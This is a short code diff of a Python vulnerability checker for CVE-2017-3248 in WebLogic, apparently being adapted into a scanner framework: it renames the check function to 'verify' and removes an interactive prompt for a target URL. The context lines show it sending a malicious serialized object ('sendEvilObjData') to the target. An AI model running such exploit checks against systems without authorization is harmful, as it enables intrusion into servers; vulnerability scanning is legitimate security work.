@@ -82,7 +82,7 @@ def run(rip,rport):
     rs=sendEvilObjData(sock,PAYLOAD[0])
     return checkVul(rs,rip,rport)
 
-def CVE_2017_3248(url):
+def verify(url):
     relsult = {
         'name': 'CVE_2017_3248(weblogic)',
         'vulnerable': False
@@ -105,6 +105,3 @@ def CVE_2017_3248(url):
         return relsult
     except:
         return relsult
-if __name__=="__main__":
-    url = input('输入目标URL:')
-    print(CVE_2017_3248(url))
